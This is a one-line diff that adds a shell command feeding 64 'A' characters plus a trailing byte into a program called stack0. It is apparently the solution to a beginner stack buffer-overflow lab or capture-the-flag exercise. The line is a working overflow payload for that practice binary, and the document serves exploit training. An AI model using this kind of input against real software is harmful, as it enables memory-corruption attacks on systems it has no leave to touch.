@@ -1,0 +1,2 @@
+python -c "print 'A'*64 + '1'" | ./stack0
+
